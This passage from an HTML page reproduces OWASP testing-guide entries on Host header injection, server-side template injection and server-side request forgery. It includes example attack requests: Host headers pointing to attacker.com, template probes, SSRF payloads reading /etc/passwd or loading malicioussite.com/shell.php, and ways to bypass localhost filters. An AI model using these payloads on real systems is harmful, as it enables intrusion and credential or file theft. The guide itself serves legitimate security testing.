                  <li>cause a redirect to an attacker-controlled domain</li>
                  <li>perform web cache poisoning</li>
                  <li>manipulate password reset functionality</li>
                </ul>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Assess if the Host header is being parsed dynamically in the application.</li>
                  <li>Bypass security controls that rely on the header.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>Initial testing is as simple as supplying another domain (i.e. <code class="language-plaintext highlighter-rouge">attacker.com</code>) into the Host header field. It is how the web server processes the header value that dictates the impact. The attack is valid when the web server processes the input to send the request to an attacker-controlled host that resides at the supplied domain, and not to an internal virtual host that resides on the web server.</p>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
                <span class="na">Host</span><span class="p">:</span> <span class="s">www.attacker.com</span>
                <span class="s">[...]</span>
                </code></pre></div></div>
                
                <p>In the simplest case, this may cause a 302 redirect to the supplied domain.</p>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
                <span class="s">[...]</span>
                <span class="na">Location</span><span class="p">:</span> <span class="s">http://www.attacker.com/login.php</span>
                
                </code></pre></div></div>
                
                <p>Alternatively, the web server may send the request to the first virtual host on the list.</p>
                
                <h3 id="x-forwarded-host-header-bypass">X-Forwarded Host Header Bypass</h3>
                
                <p>In the event that Host header injection is mitigated by checking for invalid input injected via the Host header, you can supply the value to the <code class="language-plaintext highlighter-rouge">X-Forwarded-Host</code> header.</p>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
                <span class="na">Host</span><span class="p">:</span> <span class="s">www.example.com</span>
                <span class="na">X-Forwarded-Host</span><span class="p">:</span> <span class="s">www.attacker.com</span>
                <span class="s">...</span>
                </code></pre></div></div>
                
                <p>Potentially producing client-side output such as:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
                <span class="nt">&lt;link</span> <span class="na">src=</span><span class="s">"http://www.attacker.com/link"</span> <span class="nt">/&gt;</span>
                ...
                </code></pre></div></div>
                
                <p>Once again, this depends on how the web server processes the header value.</p>
                
                <h3 id="web-cache-poisoning">Web Cache Poisoning</h3>
                
                <p>Using this technique, an attacker can manipulate a web-cache to serve poisoned content to anyone who requests it. This relies on the ability to poison the caching proxy run by the application itself, CDNs, or other downstream providers. As a result, the victim will have no control over receiving the malicious content when requesting the vulnerable application.</p>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
                <span class="na">Host</span><span class="p">:</span> <span class="s">www.attacker.com</span>
                <span class="s">...</span>
                </code></pre></div></div>
                
                <p>The following will be served from the web cache, when a victim visits the vulnerable application.</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
                <span class="nt">&lt;link</span> <span class="na">src=</span><span class="s">"http://www.attacker.com/link"</span> <span class="nt">/&gt;</span>
                ...
                </code></pre></div></div>
                
                <h3 id="password-reset-poisoning">Password Reset Poisoning</h3>
                
                <p>It is common for password reset functionality to include the Host header value when creating password reset links that use a generated secret token. If the application processes an attacker-controlled domain to create a password reset link, the victim may click on the link in the email and allow the attacker to obtain the reset token, thus resetting the victim’s password.</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>... Email snippet ...
                
                Click on the following link to reset your password:
                
                http://www.attacker.com/index.php?module=Login&amp;action=resetPassword&amp;token=&lt;SECRET_TOKEN&gt;
                
                ... Email snippet ...
                </code></pre></div></div>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/">What is a Host Header Attack?</a></li>
                  <li><a href="https://www.briskinfosec.com/blogs/blogsdetail/Host-Header-Attack">Host Header Attack</a></li>
                  <li><a href="https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html">Practical HTTP Host Header Attacks</a></li>
                </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv18Modal" tabindex="-1" role="dialog" aria-labelledby="inpv18ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv18ModalLabel">WSTG-INPV-18 - Testing for Server-side Template Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>Web applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. Server-side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. Any features that support advanced user-supplied markup may be vulnerable to SSTI including wiki-pages, reviews, marketing applications, CMS systems etc. Some template engines employ various mechanisms (eg. sandbox, allow listing, etc.) to protect against SSTI.</p>
                
                <h3 id="example---twig">Example - Twig</h3>
                
                <p>The following example is an excerpt from the <a href="https://github.com/s4n7h0/xvwa">Extreme Vulnerable Web Application</a> project.</p>
                
                <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">getFilter</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
                <span class="p">{</span>
                        <span class="p">[</span><span class="n">snip</span><span class="p">]</span>
                        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filterCallbacks</span> <span class="k">as</span> <span class="nv">$callback</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="kc">false</span> <span class="o">!==</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
                            <span class="k">return</span> <span class="nv">$filter</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
                <p>In the getFilter function the <code class="language-plaintext highlighter-rouge">call_user_func($callback, $name)</code> is vulnerable to SSTI: the <code class="language-plaintext highlighter-rouge">name</code> parameter is fetched from the HTTP GET request and executed by the server:</p>
                
                
                <h3 id="example---flaskjinja2">Example - Flask/Jinja2</h3>
                
                <p>The following example uses Flask and Jinja2 templating engine. The <code class="language-plaintext highlighter-rouge">page</code> function accepts a ‘name’ parameter from an HTTP GET request and renders an HTML response with the <code class="language-plaintext highlighter-rouge">name</code> variable content:</p>
                
                <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o"></span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/page"</span><span class="p">)</span>
                <span class="k">def</span> <span class="nf">page</span><span class="p">():</span>
                    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">values</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'name'</span><span class="p">)</span>
                    <span class="n">output</span> <span class="o">=</span> <span class="n">Jinja2</span><span class="p">.</span><span class="n">from_string</span><span class="p">(</span><span class="s">'Hello '</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">'!'</span><span class="p">).</span><span class="n">render</span><span class="p">()</span>
                    <span class="k">return</span> <span class="n">output</span>
                </code></pre></div></div>
                
                <p>This code snippet is vulnerable to XSS but it is also vulnerable to SSTI. Using the following as a payload in the <code class="language-plaintext highlighter-rouge">name</code> parameter:</p>
                
                <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-g</span> <span class="s1">'http://www.target.com/page?name={{7*7}}'</span>
                Hello 49!
                </code></pre></div></div>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Detect template injection vulnerability points.</li>
                  <li>Identify the templating engine.</li>
                  <li>Build the exploit.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>SSTI vulnerabilities exist either in text or code context. In plaintext context users allowed to use freeform ‘text’ with direct HTML code. In code context the user input may also be placed within a template statement (eg. in a variable name)</p>
                
                <h3 id="identify-template-injection-vulnerability">Identify Template Injection Vulnerability</h3>
                
                <p>The first step in testing SSTI in plaintext context is to construct common template expressions used by various template engines as payloads and monitor server responses to identify which template expression was executed by the server.</p>
                
                <p>Common template expression examples:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a{{bar}}b
                a{{7*7}}
                {var} ${var} {{var}} &lt;%var%&gt; [% var %]
                </code></pre></div></div>
                
                <p>In this step an extensive <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">template expression test strings/payloads list</a> is recommended.</p>
                
                <p>Testing for SSTI in code context is slightly different. First, the tester constructs the request that result either blank or error server responses. In the example below the HTTP GET parameter is inserted info the variable <code class="language-plaintext highlighter-rouge">personal_greeting</code> in a template statement:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>personal_greeting=username
                Hello user01
                </code></pre></div></div>
                
                <p>Using the following payload - the server response is blank “Hello”:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>personal_greeting=username&lt;tag&gt;
                Hello
                </code></pre></div></div>
                
                <p>In the next step is to break out of the template statement and injecting HTML tag after it using the following payload</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>personal_greeting=username}}&lt;tag&gt;
                Hello user01 &lt;tag&gt;
                </code></pre></div></div>
                
                <h3 id="identify-the-templating-engine">Identify the Templating Engine</h3>
                
                <p>Based on the information from the previous step now the tester has to identify which template engine is used by supplying various template expressions. Based on the server responses the tester deduces the template engine used. This manual approach is discussed in greater detail in <a href="https://portswigger.net/blog/server-side-template-injection?#Identify">this</a> PortSwigger article. To automate the identification of the SSTI vulnerability and the templating engine various tools are available including <a href="https://github.com/epinna/tplmap">Tplmap</a> or the <a href="https://github.com/PortSwigger/backslash-powered-scanner">Backslash Powered Scanner Burp Suite extension</a>.</p>
                
                <h3 id="build-the-rce-exploit">Build the RCE Exploit</h3>
                
                <p>The main goal in this step is to identify to gain further control on the server with an RCE exploit by studying the template documentation and research. Key areas of interest are:</p>
                
                <ul>
                  <li><strong>For template authors</strong> sections covering basic syntax.</li>
                  <li><strong>Security considerations</strong> sections.</li>
                  <li>Lists of built-in methods, functions, filters, and variables.</li>
                  <li>Lists of extensions/plugins.</li>
                </ul>
                
                <p>The tester can also identify what other objects, methods and properties can be exposed by focusing on the <code class="language-plaintext highlighter-rouge">self</code> object. If the <code class="language-plaintext highlighter-rouge">self</code> object is not available and the documentation does not reveal the technical details, a brute force of the variable name is recommended. Once the object is identified the next step is to loop through the object to identify all the methods, properties and attributes that are accessible through the template engine. This could lead to other kinds of security findings  including privilege escalations, information disclosure about application passwords, API keys, configurations and environment variables, etc.</p>
                
                <h2 id="tools">Tools</h2>
                
                <ul>
                  <li><a href="https://github.com/epinna/tplmap">Tplmap</a></li>
                  <li><a href="https://github.com/PortSwigger/backslash-powered-scanner">Backslash Powered Scanner Burp Suite extension</a></li>
                  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Template expression test strings/payloads list</a></li>
                </ul>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="https://portswigger.net/kb/papers/serversidetemplateinjection.pdf">James Kettle: Server-Side Template Injection:RCE for the modern webapp (whitepaper)</a></li>
                  <li><a href="https://portswigger.net/blog/server-side-template-injection">Server-Side Template Injection</a></li>
                  <li><a href="https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/">Exploring SSTI in Flask/Jinja2</a></li>
                  <li><a href="https://www.okiok.com/server-side-template-injection-from-detection-to-remote-shell/">Server Side Template Injection: from detection to Remote shell</a></li>
                  <li><a href="https://github.com/s4n7h0/xvwa">Extreme Vulnerable Web Application</a></li>
                  <li><a href="https://owasp.org/www-pdf-archive/Owasp_SSTI_final.pdf">Divine Selorm Tsa: Exploiting server side template injection with tplmap</a></li>
                  <li><a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/">Exploiting SSTI in Thymeleaf</a></li>
                </ul>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv19Modal" tabindex="-1" role="dialog" aria-labelledby="inpv19ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv19ModalLabel">WSTG-INPV-19 - Testing for Server-Side Request Forgery</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify SSRF injection points.</li>
                  <li>Test if the injection points are exploitable.</li>
                  <li>Asses the severity of the vulnerability.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.</p>
                
                <p>Consider the following request:</p>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">GET https://example.com/page?page=about.php
                </span></code></pre></div></div>
                
                <p>You can test this request with the following payloads.</p>
                
                <h3 id="load-the-contents-of-a-file">Load the Contents of a File</h3>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">GET https://example.com/page?page=https://malicioussite.com/shell.php
                </span></code></pre></div></div>
                
                <h3 id="access-a-restricted-page">Access a Restricted Page</h3>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">GET https://example.com/page?page=http://localhost/admin
                </span></code></pre></div></div>
                
                <p>Or:</p>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">GET https://example.com/page?page=http://127.0.0.1/admin
                </span></code></pre></div></div>
                
                <p>Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the <code class="language-plaintext highlighter-rouge">admin</code> page.</p>
                
                <p>These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.</p>
                
                <h3 id="fetch-a-local-file">Fetch a Local File</h3>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">GET https://example.com/page?page=file:///etc/passwd
                </span></code></pre></div></div>
                
                <h3 id="http-methods-used">HTTP Methods Used</h3>
                
                <p>All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.</p>
                
                <p>One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.</p>
                
                <p>You can find more on Blind SSRF <a href="https://portswigger.net/web-security/ssrf/blind">here</a>, or in the <a href="#references">references section</a>.</p>
                
                <h3 id="pdf-generators">PDF Generators</h3>
                
                <p>In some cases, a server may convert uploaded files to PDF format. Try injecting <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code>, <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code>, <code class="language-plaintext highlighter-rouge">&lt;base&gt;</code>, or <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> elements, or CSS <code class="language-plaintext highlighter-rouge">url()</code> functions pointing to internal services.</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"file:///etc/passwd"</span> <span class="na">width=</span><span class="s">"400"</span> <span class="na">height=</span><span class="s">"400"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"file:///c:/windows/win.ini"</span> <span class="na">width=</span><span class="s">"400"</span> <span class="na">height=</span><span class="s">"400"</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <h3 id="common-filter-bypass">Common Filter Bypass</h3>
                
                <p>Some applications block references to <code class="language-plaintext highlighter-rouge">localhost</code> and <code class="language-plaintext highlighter-rouge">127.0.0.1</code>. This can be circumvented by:</p>
                
                <ul>
                  <li>Using alternative IP representation that evaluate to <code class="language-plaintext highlighter-rouge">127.0.0.1</code>:
                    <ul>
                      <li>Decimal notation: <code class="language-plaintext highlighter-rouge">2130706433</code></li>
                      <li>Octal notation: <code class="language-plaintext highlighter-rouge">017700000001</code></li>
                      <li>IP shortening: <code class="language-plaintext highlighter-rouge">127.1</code></li>
                    </ul>
                  </li>
                  <li>String obfuscation</li>
                  <li>Registering your own domain that resolves to <code class="language-plaintext highlighter-rouge">127.0.0.1</code></li>
                </ul>
                
                <p>Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to <a href="https://tools.ietf.org/html/rfc3986#section-7.6">semantic attacks</a>.</p>
                
                <ul>
                  <li>Using the <code class="language-plaintext highlighter-rouge"></code> character to separate between the userinfo and the host: <code class="language-plaintext highlighter-rouge">https://expected-domain@attacker-domain</code></li>
                  <li>URL fragmentation with the <code class="language-plaintext highlighter-rouge">#</code> character: <code class="language-plaintext highlighter-rouge">https://attacker-domain#expected-domain</code></li>
                  <li>URL encoding</li>
                  <li>Fuzzing</li>
                  <li>Combinations of all of the above</li>
                </ul>
                
                <p>For additional payloads and bypass techniques, see the <a href="#references">references</a> section.</p>
                
                <h2 id="remediation">Remediation</h2>
                
                <p>SSRF is known to be one of the hardest attacks to defeat without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, read the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">Server Side Request Forgery Prevention Cheatsheet</a>.</p>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">swisskyrepo: SSRF Payloads</a></li>
                  <li><a href="https://medium.com/neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb">Reading Internal Files Using SSRF Vulnerability</a></li>
                  <li><a href="https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/">Abusing the AWS Metadata Service Using SSRF Vulnerabilities</a></li>
                  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP Server Side Request Forgery Prevention Cheatsheet</a></li>
                  <li><a href="https://portswigger.net/web-security/ssrf">Portswigger: SSRF</a></li>
                  <li><a href="https://portswigger.net/web-security/ssrf/blind">Portswigger: Blind SSRF</a></li>
                  <li><a href="https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/">Bugcrowd Webinar: SSRF</a></li>
                  <li><a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF">Hackerone Blog: SSRF</a></li>
                  <li><a href="https://www.hacker101.com/sessions/ssrf.html">Hacker101: SSRF</a></li>
                  <li><a href="https://tools.ietf.org/html/rfc3986">URI Generic Syntax</a></li>
                </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>



